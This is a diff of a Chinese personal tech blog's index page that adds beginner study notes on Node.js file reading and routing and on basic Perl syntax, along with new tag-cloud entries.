class="string">'./images/1.png'</span>, response);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">"move on"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://ww3.sinaimg.cn/large/006tNc79gy1fdtde06l42j30pa0c2gmo.jpg" alt="读取图片"></p>
+<h1 id="路由改造"><a href="#路由改造" class="headerlink" title="路由改造"></a>路由改造</h1><blockquote>
+<p>models/optfile.js<br>可显示文本和图片<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">	<span class="attr">writefile</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, data, recall</span>)</span>&#123;<span class="comment">//异步方式</span></div><div class="line">		fs.writeFile(path, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</div><div class="line">			<span class="keyword">if</span> (err)&#123;</div><div class="line">				<span class="keyword">throw</span> err;</div><div class="line">			&#125;</div><div class="line">			<span class="built_in">console</span>.log(<span class="string">'It\'s Saved!'</span>);<span class="comment">//文件被保存</span></div><div class="line">			recall(<span class="string">"write file success."</span>);</div><div class="line">		&#125;);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">writeFileSync</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, data</span>)</span>&#123;<span class="comment">//同步方式</span></div><div class="line">		fs.writeFileSync(path, data);</div><div class="line">		<span class="built_in">console</span>.log(<span class="string">"同步写文件完成"</span>);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">readImg</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, res</span>)</span>&#123;</div><div class="line">		fs.readFile(path, <span class="string">'binary'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, file</span>)</span>&#123;</div><div class="line">			<span class="keyword">if</span> (err)&#123;</div><div class="line">				<span class="built_in">console</span>.log(err);</div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">				<span class="built_in">console</span>.log(<span class="string">'输出文件'</span>);</div><div class="line">				res.write(file, <span class="string">'binary'</span>);</div><div class="line">				res.end();</div><div class="line">			&#125;</div><div class="line">		&#125;);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">readfile</span>:<span class="function"><span class="keyword">function</span>(<span class="params">path, recall</span>)</span>&#123;<span class="comment">//异步读取</span></div><div class="line">			fs.readFile(path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</div><div class="line">					<span class="keyword">if</span>(err)&#123;</div><div class="line">							<span class="built_in">console</span>.log(err);</div><div class="line">			&#125;<span class="keyword">else</span>&#123;</div><div class="line">					<span class="built_in">console</span>.log(data.toString());</div><div class="line">					recall(data);</div><div class="line">			&#125;</div><div class="line">	&#125;);</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'异步方法执行完毕'</span>);</div><div class="line">&#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>models/route.js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> optfile = <span class="built_in">require</span>(<span class="string">'./optfile'</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRecall</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">	res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html; charset=utf-8'</span>&#125;);</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">		res.write(data);</div><div class="line">		res.end(<span class="string">" "</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> recall;</div><div class="line">&#125;</div><div class="line"><span class="built_in">module</span>.exports=&#123;</div><div class="line">	<span class="attr">login</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		recall = getRecall(req, res);</div><div class="line">		optfile.readfile(<span class="string">'./views/login.html'</span>, recall);</div><div class="line">	&#125;,</div><div class="line"></div><div class="line">	<span class="attr">admin</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.readfile(<span class="string">'./views/admin.html'</span>, recall);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">writefile</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">recall</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">			res.write(data);</div><div class="line">			res.end(<span class="string">" "</span>);</div><div class="line">		&#125;</div><div class="line">		optfile.writefile(<span class="string">'./views/test.txt'</span>, <span class="string">'write file ok1.'</span>, recall);</div><div class="line">	&#125;,</div><div class="line">	<span class="attr">showimg</span>:<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">		res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'image/jpeg'</span>&#125;);</div><div class="line">		optfile.readImg(<span class="string">'./images/1.png'</span>, res);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>n8_routhtml.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> router = <span class="built_in">require</span>(<span class="string">'./models/route'</span>);</div><div class="line"></div><div class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>)</span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(request.url!==<span class="string">"/favicon.ico"</span>)&#123;</div><div class="line">		<span class="keyword">var</span> pathname = url.parse(request.url).pathname;</div><div class="line">		pathname = pathname.replace(<span class="regexp">/\//</span>, <span class="string">''</span>);</div><div class="line">		<span class="built_in">console</span>.log(pathname);</div><div class="line">		router[pathname](request, response);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;).listen(<span class="number">8000</span>);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Server running at http://127.0.0.1:8000/"</span>);</div></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="https://ww1.sinaimg.cn/large/006tNc79gy1fdtdefobhpj30ig0epq3q.jpg" alt="路由改造效果图"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Perl</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/others/" class="article-tag-list-link color2">others</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/others/Node-js学习笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-MongoDB-基本操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -589,6 +1184,100 @@ var _hmt = _hmt || [];
 
 
   
+    <article id="post-Perl-学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/others/Perl-学习笔记/">Perl 学习笔记</a>
+    </h1>
+  
+
+        
+        <a href="/others/Perl-学习笔记/" class="archive-article-date">
+  	<time datetime="2015-08-10T03:25:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2015-08-10</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="交互式环境"><a href="#交互式环境" class="headerlink" title="交互式环境"></a>交互式环境</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">➜  ~ perl -e</div><div class="line">No code specified for -e.</div><div class="line">➜  ~ perl -e &apos;print &quot;Hello World&quot;&apos;</div><div class="line">Hello World%                                                                    </div><div class="line">➜  ~ perl -e &apos;print &quot;Hello World\n&quot;&apos;</div><div class="line">Hello World</div></pre></td></tr></table></figure>
+<h1 id="脚本式编程与注射"><a href="#脚本式编程与注射" class="headerlink" title="脚本式编程与注射"></a>脚本式编程与注射</h1><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#This is single-line comments.</span></div><div class="line"><span class="keyword">print</span> <span class="string">"Hello, World\n"</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">=pod comments</span></div><div class="line">This is multiline comment</div><div class="line">This is multiline comment</div><div class="line">This is multiline comment</div><div class="line">This is multiline comment</div><div class="line">=cut</div></pre></td></tr></table></figure>
+<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><blockquote>
+<p>Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。<br>三个基本的数据类型：标量、数组、哈希<br>Perl 为每个变量类型设置了独立的命令空间，所以不同类型的变量可以使用相同的名称，如 $foo 和 @foo 是两个不同的变量。</p>
+<h2 id="标量"><a href="#标量" class="headerlink" title="标量"></a>标量</h2><p>在变量名前加$表示是标量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#number</div><div class="line">$my_number=123;</div><div class="line"></div><div class="line">#string</div><div class="line">$my_str=&quot;123&quot;;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="标量运算"><a href="#标量运算" class="headerlink" title="标量运算"></a>标量运算</h3><blockquote>
+<p>.可以用来链接两个标量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">print ( &quot;$my_number . $my_str\n&quot;);</div></pre></td></tr></table></figure></p>
+</blockquote>
+<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><blockquote>
+<p>分别表示当前执行脚本的文件名，行号，包名。<br>这些特殊字符是单独的标记，不能写在字符串中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">print &quot;FileName:&quot; . &quot;\t&quot;.__FILE__.&quot;\n&quot;;</div><div class="line">print &quot;LineNumber:&quot; . &quot;\t&quot;.__LINE__.&quot;\n&quot;;</div><div class="line">print &quot;PackageName:&quot; . &quot;\t&quot;.__PACKAGE__.&quot;\n&quot;;</div></pre></td></tr></table></figure></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">FileName:	run.pl</div><div class="line">LineNumber:	28</div><div class="line">PackageName:	main</div></pre></td></tr></table></figure>
+<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><blockquote>
+<p>数组变量以字符”@”开头，索引从0开始<br>也可以以 qw 开始定义数组</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@arr=(2,3,5);</div><div class="line">print @arr[2];</div><div class="line">@array = qw/这是 一个 数组/;</div></pre></td></tr></table></figure>
+<h3 id="数组序列号"><a href="#数组序列号" class="headerlink" title="数组序列号"></a>数组序列号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  ~ perl -e &quot;print(&quot;1..10&quot;,&quot;\n&quot;)&quot;</div><div class="line">12345678910n%</div></pre></td></tr></table></figure>
+<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><blockquote>
+<p>哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值<br>类似Python的字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">%hash=(&apos;name&apos;=&gt;&apos;LongLi&apos;,&apos;age&apos;=&gt;18);</div><div class="line">print  (%hash&#123;&apos;name&apos;&#125;, &quot;\n&quot;);</div><div class="line">print  (%hash&#123;&apos;age&apos;&#125;, &quot;\n&quot;);</div></pre></td></tr></table></figure></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜  test  ./run.pl  </div><div class="line">Hello, World</div><div class="line">nameLongLi</div><div class="line">age18</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Perl</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/others/" class="article-tag-list-link color2">others</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/others/Perl-学习笔记/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
   
 
 
@@ -670,6 +1359,14 @@ var _hmt = _hmt || [];
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Metasploit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Docker</a>
               </li>
              
@@ -678,11 +1375,23 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">LVM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">数据库</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">MongoDB</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Perl</a>
               </li>
              
               <li class="article-tag-list-item">
